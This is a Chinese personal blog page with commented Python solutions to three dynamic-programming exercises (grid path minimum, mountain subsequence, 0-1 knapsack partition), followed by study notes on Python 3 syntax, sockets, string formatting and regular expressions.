      <h2 id="动态规划⭐"><a href="#动态规划⭐" class="headerlink" title="动态规划⭐"></a><strong>动态规划⭐</strong></h2><p>众所周知，牛妹有很多很多粉丝，粉丝送了很多很多礼物给牛妹，牛妹的礼物摆满了地板。  地板是N×MN\times MN×M的格子，每个格子有且只有一个礼物，牛妹已知每个礼物的体积。 地板的坐标是左上角(1,1) 右下角（N, M）。 牛妹只想要从屋子左上角走到右下角，每次走一步，每步只能向下走一步或者向右走一步或者向右下走一步，每次走过一个格子，拿起（并且必须拿上）这个格子上的礼物。牛妹想知道，她能走到最后拿起的所有礼物体积最小和是多少？ </p>
<p><strong>真的是非常简单的动态规划了，好久没敲代码了，虽然简单，但是也要熟悉呀，略菜备注较多哈~</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">selectPresent</span><span class="params">(self ,presentVolumn)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> presentVolumn:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        N=len(presentVolumn)<span class="comment">#行数</span></span><br><span class="line">        M=len(presentVolumn[<span class="number">0</span>])<span class="comment">#列数</span></span><br><span class="line">        dp=[[<span class="number">0</span>]*M <span class="keyword">for</span> _ <span class="keyword">in</span> range(N)]  <span class="comment">#for _ in range(x) _表示占位符，功能只是用于循环</span></span><br><span class="line">        print(dp)  <span class="comment">#dp用于表示走到该格子，当前的总价值</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=presentVolumn[<span class="number">0</span>][<span class="number">0</span>] <span class="comment">#初始化1x1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,N):</span><br><span class="line">            dp[i][<span class="number">0</span>]=dp[i<span class="number">-1</span>][<span class="number">0</span>]+presentVolumn[i][<span class="number">0</span>] <span class="comment">#初始化价值</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,M):</span><br><span class="line">            dp[<span class="number">0</span>][i]=dp[<span class="number">0</span>][i<span class="number">-1</span>]+presentVolumn[<span class="number">0</span>][i] <span class="comment">#初始化</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,N):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,M):</span><br><span class="line">                dp[i][j]=min(dp[i<span class="number">-1</span>][j<span class="number">-1</span>],dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>])+presentVolumn[i][j] <span class="comment">#更新总价值，看左上角、左边、上边的最小值，进行更新</span></span><br><span class="line">        <span class="keyword">return</span> dp[i][j]</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n = int(input()) <span class="comment">#// 输入二维数组的行数</span></span><br><span class="line">    line = [[<span class="number">0</span>] * n] * n <span class="comment">#// 初始化二维数组</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        line[i] = input().split(<span class="string">" "</span>) <span class="comment">#输入二维数组，同行数字用空格分隔，不同行则用回车换行</span></span><br><span class="line">        line[i] = [int(j) <span class="keyword">for</span> j <span class="keyword">in</span> line[i]]<span class="comment"># // 将数组中的每一行转换成整型</span></span><br><span class="line">    print(line) <span class="comment">#// 打印二维数组1</span></span><br><span class="line">    print(Solution().selectPresent(line))</span><br></pre></td></tr></table></figure>

<h2 id="动态规划⭐⭐—最长公共子序列"><a href="#动态规划⭐⭐—最长公共子序列" class="headerlink" title="动态规划⭐⭐—最长公共子序列"></a><strong>动态规划⭐⭐—最长公共子序列</strong></h2><p>  众所周知，牛妹是一个offer收割姬，这次面试她遇到了这样的一个问题。 </p>
<p>  给了一个序列，让找出最长的“凸子序列” </p>
<p>  何为“凸子序列”：数列中有一个xi,使得所有x0&lt;x1&lt;x2….xi-1&lt;xi且xi&gt;xi+1&gt;xi+1&gt;….&gt;xn  </p>
<p>  eg：12345431,是山峰序列，12345234不是山峰序列 </p>
<p>  注：单调递增或单调递减序列也算山峰序列；单独一个数是长度为1的山峰序列</p>
<p><strong>纠结了很久，还是没好好审题，要的是从第一个元素开始就递增的，这样只需要判断后面的元素是否比它大就行</strong></p>
<p><strong>然后从右侧反向递增，同前面一样，找比最后一个元素大的，然后对两者进行相加，减去公共的，即可求解</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mountainSequence</span><span class="params">(self, numberList )</span>:</span></span><br><span class="line">        <span class="comment"># write code here</span></span><br><span class="line">        n = len(numberList)</span><br><span class="line">        <span class="keyword">if</span> n==<span class="number">1</span> :<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        up=[<span class="number">1</span>]*n</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n): <span class="comment">#正向递增</span></span><br><span class="line">            print(<span class="string">"------"</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i):</span><br><span class="line">                <span class="keyword">if</span> numberList[i]&gt;numberList[j] <span class="keyword">and</span> up[i]&lt;up[j]+<span class="number">1</span>: <span class="comment">#正推</span></span><br><span class="line">                    up[i]=up[j]+<span class="number">1</span></span><br><span class="line">        down=[<span class="number">1</span>]*n</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>): <span class="comment">#反向递增 (10,-1,-1) ,注意这是是n-1</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(n<span class="number">-1</span>,i,<span class="number">-1</span>): <span class="comment">#(10,10.9.8..0,-1)</span></span><br><span class="line">                <span class="keyword">if</span> numberList[j]&lt;numberList[i] <span class="keyword">and</span> down[i]&lt;down[j]+<span class="number">1</span>:</span><br><span class="line">                    down[i]=down[j]+<span class="number">1</span></span><br><span class="line">        res=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            res=max(res,down[i]+up[i]<span class="number">-1</span>) <span class="comment">#交叉点重复了</span></span><br><span class="line">            print(res)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<h2 id="动态规划⭐⭐—0-1背包问题"><a href="#动态规划⭐⭐—0-1背包问题" class="headerlink" title="动态规划⭐⭐—0-1背包问题"></a><strong>动态规划⭐⭐—0-1背包问题</strong></h2><p>众所周知，牛能和牛可乐经常收到小粉丝们送来的礼物，每个礼物有特定的价值，他俩想要尽可能按照自己所得价值来平均分配所有礼物。那么问题来了，在最优的情况下，他俩手中得到的礼物价值和的最小差值是多少呢？ </p>
<p>p.s 礼物都很珍贵，所以不可以拆开算哦 </p>
<p><strong>这题的本质就是0-1背包问题，只要将总价值向上取一半作为背包容量，尽可能的装满这个背包，则所求差值最小</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maxPresent</span><span class="params">(presentVec)</span>:</span></span><br><span class="line">    volumn = sum(presentVec)</span><br><span class="line">    one_person = (volumn+<span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    dp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(one_person + <span class="number">1</span>)] <span class="comment">#背包容量</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(presentVec)): <span class="comment">#物品数量</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(one_person, presentVec[i] - <span class="number">1</span>, <span class="number">-1</span>): <span class="comment">#range(start, stop, step)  (背包容量,物体体积，倒过来)</span></span><br><span class="line">            <span class="keyword">if</span> dp[j - presentVec[i]] + presentVec[i] &gt; dp[j]: <span class="comment">#判断是否最优，更新背包</span></span><br><span class="line">                dp[j] = dp[j - presentVec[i]] + presentVec[i]</span><br><span class="line">                <span class="comment">#print(dp[j])</span></span><br><span class="line">    maxvalue = dp[one_person]</span><br><span class="line">    <span class="keyword">return</span> abs(maxvalue - (volumn - maxvalue))</span><br></pre></td></tr></table></figure>









<hr>
<h2 id="python3-语法随笔小记"><a href="#python3-语法随笔小记" class="headerlink" title="python3 语法随笔小记"></a><strong>python3 语法随笔小记</strong></h2><h4 id="data-b’’-join-buffer-如何理解？"><a href="#data-b’’-join-buffer-如何理解？" class="headerlink" title="data=b’’.join(buffer)如何理解？"></a><strong>data=b’’.join(buffer)如何理解？</strong></h4><p>b’’是一个空字节，join是连接列表的函数，buffer是一个字节串的列表<br>连起来的意思就是使用空字节把buffer这个字节列表连接在一起，成为一个新的字节串<br>这个是python3新的地方，以前join只能连接字符串，现在可以连接字节串<br>功能就是把[b’ab’,b’cd’,b’ef’]变成 b’abcdef’ </p>
<h4 id="time-sleep-t"><a href="#time-sleep-t" class="headerlink" title="time.sleep(t)"></a><strong>time.sleep(t)</strong></h4><p>需要加 import time</p>
<h4 id="socket-函数"><a href="#socket-函数" class="headerlink" title="socket()函数"></a><strong>socket()函数</strong></h4><p>服务器端套接字</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s.bind()<span class="comment">#绑定地址（host,port）到套接字， 在AF_INET下,以元组（host,port）的形式表示地址。</span></span><br><span class="line">s.listen()<span class="comment">#开始TCP监听。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。</span></span><br><span class="line">s.accept()<span class="comment">#被动接受TCP客户端连接,(阻塞式)等待连接的到来</span></span><br></pre></td></tr></table></figure>

<p>客户端套接字</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s.connect()<span class="comment">#主动初始化TCP服务器连接，。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。</span></span><br><span class="line">s.connect_ex()<span class="comment">#connect()函数的扩展版本,出错时返回出错码,而不是抛出异常</span></span><br></pre></td></tr></table></figure>

<p>公共用途的套接字函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">s.recv()<span class="comment">#接收TCP数据，数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。</span></span><br><span class="line">s.send()<span class="comment">#发送TCP数据，将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。</span></span><br><span class="line">s.sendall()<span class="comment">#完整发送TCP数据，完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。</span></span><br><span class="line">s.recvfrom()<span class="comment">#接收UDP数据，与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。</span></span><br><span class="line">s.sendto()<span class="comment">#发送UDP数据，将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。</span></span><br><span class="line">s.close()<span class="comment">#关闭套接字</span></span><br><span class="line">s.getpeername()<span class="comment">#返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。</span></span><br><span class="line">s.getsockname()<span class="comment">#返回套接字自己的地址。通常是一个元组(ipaddr,port)</span></span><br><span class="line">s.setsockopt(level,optname,value)<span class="comment">#设置给定套接字选项的值。</span></span><br><span class="line">s.getsockopt(level,optname[.buflen])<span class="comment">#返回套接字选项的值。</span></span><br><span class="line">s.settimeout(timeout)<span class="comment">#设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如connect()）</span></span><br><span class="line">s.gettimeout()<span class="comment">#返回当前超时期的值，单位是秒，如果没有设置超时期，则返回None。</span></span><br><span class="line">s.fileno()<span class="comment">#返回套接字的文件描述符。</span></span><br><span class="line">s.setblocking(flag)<span class="comment">#如果flag为0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用recv()没有发现任何数据，或send()调用无法立即发送数据，那么将引起socket.error异常。</span></span><br><span class="line">s.makefile()<span class="comment">#创建一个与该套接字相关连的文件</span></span><br></pre></td></tr></table></figure>

<p><strong>accept方法会返回一个含有两个元素的元组，（fd,addr）。</strong></p>
<p><strong>第一个元素是新的socket对象，服务器通过它与客户端通信。第二个元素是客户端的地址及端口信息。</strong></p>
<h4 id="格式化输出-s-d-等"><a href="#格式化输出-s-d-等" class="headerlink" title="格式化输出 %s %d 等"></a><strong>格式化输出 %s %d 等</strong></h4><table>
<thead>
<tr>
<th>%%</th>
<th>百分号标记</th>
</tr>
</thead>
<tbody><tr>
<td>%c</td>
<td>字符及其ASCII码</td>
</tr>
<tr>
<td><strong>%s</strong></td>
<td><strong>字符串</strong></td>
</tr>
<tr>
<td><strong>%d</strong></td>
<td><strong>有符号整数(十进制)</strong></td>
</tr>
<tr>
<td>%u</td>
<td>无符号整数(十进制)</td>
</tr>
<tr>
<td>%o</td>
<td>无符号整数(八进制)</td>
</tr>
<tr>
<td>%x</td>
<td>无符号整数(十六进制)</td>
</tr>
<tr>
<td>%X</td>
<td>无符号整数(十六进制大写字符)</td>
</tr>
<tr>
<td>%e</td>
<td>浮点数字(科学计数法)</td>
</tr>
<tr>
<td>%E</td>
<td>浮点数字(科学计数法，用E代替e)</td>
</tr>
<tr>
<td>%f</td>
<td>浮点数字(用小数点符号)</td>
</tr>
<tr>
<td>%g</td>
<td>浮点数字(根据值的大小采用%e或%f)</td>
</tr>
<tr>
<td>%G</td>
<td>浮点数字(类似于%g)</td>
</tr>
<tr>
<td>%p</td>
<td>指针(用十六进制打印值的内存地址)</td>
</tr>
<tr>
<td>%n</td>
<td>存储输出字符的数量放进参数列表的下一个变量中</td>
</tr>
</tbody></table>
<h4 id="format-格式化函数"><a href="#format-格式化函数" class="headerlink" title="format 格式化函数"></a>format 格式化函数</h4><p>基本语法是通过 {} 和 : 来代替以前的 % 。</p>
<p>format 函数可以接受不限个参数，位置可以不按顺序。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"网站名：&#123;name&#125;, 地址 &#123;url&#125;"</span>.format(name=<span class="string">"菜鸟教程"</span>, url=<span class="string">"www.runoob.com"</span>))</span><br></pre></td></tr></table></figure>

<h3 id="python2和python3的一些区别"><a href="#python2和python3的一些区别" class="headerlink" title="python2和python3的一些区别"></a>python2和python3的一些区别</h3><p>b = b”example”    # bytes object   </p>
<p>s = “example”     # str object  </p>
<ul>
<li>chj=str.encode(c)  str to bytes </li>
<li>chj=bytes.decode(c) bytes to str</li>
</ul>
<hr>
<h2 id="Python-核心编程学习"><a href="#Python-核心编程学习" class="headerlink" title="Python 核心编程学习"></a><strong>Python 核心编程学习</strong></h2><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a><strong>正则表达式</strong></h3><p><strong>引入re模块 ——-import re</strong></p>
<table>
<thead>
<tr>
<th align="center">表示法</th>
<th>描述</th>
<th>例子</th>
<th>匹配对象</th>
</tr>
</thead>
<tbody><tr>
<td align="center">chj</td>
<td>匹配文本字符串的值chj</td>
<td>chj</td>
<td></td>
</tr>
<tr>
<td align="center">re1 | re2</td>
<td>匹配正则表达式re1或者re2</td>
<td>chj | bar</td>
<td></td>
</tr>
<tr>
<td align="center">.</td>
<td>匹配任何字符（除了\n）</td>
<td>a.a</td>
<td></td>
</tr>
<tr>
<td align="center">^</td>
<td>匹配字符串的起始部分</td>
<td>^Dear</td>
<td></td>
</tr>
<tr>
<td align="center">$</td>
<td>匹配字符串的终止部分</td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center"><strong>+</strong></td>
<td><strong>匹配1次或者多次前面的表达式</strong></td>
<td><strong>chj+</strong></td>
<td><strong>chj以及chjj   等价于{1,}</strong></td>
</tr>
<tr>
<td align="center">?</td>
<td><strong>匹配0次或者1次前面的表达式</strong></td>
<td>goo?</td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>re.compile(r’[A-F0-9]+’)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">s = <span class="string">"adfad asdfasdf asdfas asdfawef asd adsfas "</span></span><br><span class="line"> </span><br><span class="line">reObj1 = re.compile(<span class="string">'((\w+)\s+\w+)'</span>)</span><br><span class="line">reObj1.findall(s)</span><br><span class="line">[(<span class="string">'adfad asdfasdf'</span>, <span class="string">'adfad'</span>), (<span class="string">'asdfas asdfawef'</span>, <span class="string">'asdfas'</span>), (<span class="string">'asd adsfas'</span>, <span class="string">'asd'</span>)]</span><br><span class="line"> </span><br><span class="line">reObj2 = re.compile(<span class="string">'(\w+)\s+\w+'</span>)</span><br><span class="line">reObj2.findall(s)</span><br><span class="line">[<span class="string">'adfad'</span>, <span class="string">'asdfas'</span>, <span class="string">'asd'</span>]</span><br><span class="line"> </span><br><span class="line">reObj3 = re.compile(<span class="string">'\w+\s+\w+'</span>)</span><br><span class="line">reObj3.findall(s)</span><br><span class="line">[<span class="string">'adfad asdfasdf'</span>, <span class="string">'asdfas asdfawef'</span>, <span class="string">'asd adsfas'</span>]</span><br></pre></td></tr></table></figure>
















      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
  </article>
  

  
  <nav class="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
  </nav>
  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul class="list-inline">
      <li>
        &copy;
        2020
        0Rld
      </li>
      <li>
        
          Powered by
        
        
        <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
        
      </li>
    </ul>
    <ul class="list-inline">
      <li>
        
        
        <span>
  <i>PV:<span id="busuanzi_value_page_pv"></span></i>
  <i>UV:<span id="busuanzi_value_site_uv"></span></i>
</span>
        
      </li>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src=''></script>
        
      </li>
    </ul>
  </div>
</footer>
    <div class="to_top">
        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>
      </div>
    </main>
      <aside class="sidebar">
        <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/1.jpg" alt="0Rld"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/2020/about">About</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="Search">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
      </aside>
      <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>Buy me a cup of coffee~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
      
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/lazyload.min.js"></script>


<script src="/js/busuanzi-2.3.pure.min.js"></script>


<script src="/js/share.js"></script>



<script src="/fancybox/jquery.fancybox.min.js"></script>




<script>
  try {
    var typed = new Typed("#subtitle", {
    strings: ['四季更替，梦境更迭','生活,旅行,思考,代码,博客','努力一定会有所获！'],
    startDelay: 0,
    typeSpeed: 200,
    loop: true,
    backSpeed: 100,
    showCursor: true
    });
  } catch (err) {
  }
  
</script>




<script>
  var ayerConfig = {
    mathjax: true
  }
</script>


<script src="/js/ayer.js"></script>


<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>



<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>


<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
  </div>
</body>

</html>